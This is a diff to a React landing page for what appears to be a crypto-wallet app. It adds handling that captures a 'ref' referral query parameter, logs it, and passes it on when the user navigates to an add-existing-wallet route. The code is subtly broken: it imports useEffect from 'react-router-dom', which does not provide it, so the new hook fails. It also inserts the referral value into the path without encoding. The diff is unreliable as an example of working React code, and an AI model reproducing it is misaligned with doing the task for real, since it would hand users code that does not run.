@@ -1,12 +1,28 @@
+// LandingPage.jsx
 import { IoChevronDown } from 'react-icons/io5'
-import { useNavigate } from 'react-router-dom'
+import { useNavigate, useLocation, useEffect } from 'react-router-dom'
 import trustShield from '../../assets/trust-shield.png'
 
 function LandingPage() {
   const navigate = useNavigate()
+  const location = useLocation()
+  
+  // Capture and display referral on landing page
+  useEffect(() => {
+    const params = new URLSearchParams(location.search)
+    const ref = params.get('ref')
+    if (ref) {
+      console.log('📢 Referral detected on landing:', ref)
+      // Optionally show a welcome banner
+    }
+  }, [location])
 
   const handleConnectWallet = () => {
-    navigate('/add-existing-wallet')
+    // Preserve referral when navigating
+    const params = new URLSearchParams(location.search)
+    const ref = params.get('ref')
+    const path = ref ? `/add-existing-wallet?ref=${ref}` : '/add-existing-wallet'
+    navigate(path)
   }
 
   return (
